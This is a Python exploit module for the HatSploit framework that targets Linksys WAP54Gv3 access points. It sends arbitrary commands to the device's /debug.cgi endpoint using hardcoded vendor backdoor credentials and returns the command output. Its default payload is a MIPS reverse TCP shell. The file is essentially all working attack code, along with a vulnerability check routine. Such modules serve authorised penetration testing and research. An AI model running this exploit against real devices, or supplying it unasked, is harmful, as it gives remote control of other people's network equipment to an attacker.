"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re
from pex.proto.http import HTTPClient

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module


class HatSploitModule(Module, Handler, HTTPClient):
    details = {
        'Category': "exploit",
        'Name': "Linksys WAP54Gv3 debug Remote Code Execution",
        'Module': "exploit/linux/linksys/wap54gv3_debug_rce",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Phil Purviance - vulnerability researcher',
        ],
        'Description': "Remote Code Execution in Linksys WAP54Gv3.",
        'Platform': "linux",
        'Rank': "high",
    }

    payload = {
        'Value': "linux/mipsle/shell_reverse_tcp",
        'Architectures': ['mipsle', 'mipsbe', 'generic'],
        'Platforms': ['linux', 'unix'],
        'Types': None,
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True,
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True,
        },
    }

    def exploit(self, remote_host, remote_port, command):
        response = self.http_request(
            method="POST",
            host=remote_host,
            port=remote_port,
            path='/debug.cgi',
            data={"data1": command, "command": "ui_debug"},
            auth=("Gemtek", "gemtekswd"),
        )

        output = re.findall(
            '<textarea rows=30 cols=100>(.+?)</textarea>', response.text, re.DOTALL
        )

        if len(output):
            return output[0]

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path="/debug.cgi",
            auth=("Gemtek", "gemtekswd"),
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.module_handle(self, 
            host=remote_host,
            method="echo",
            sender=self.exploit,
            args={'remote_host': remote_host, 'remote_port': remote_port},
        )
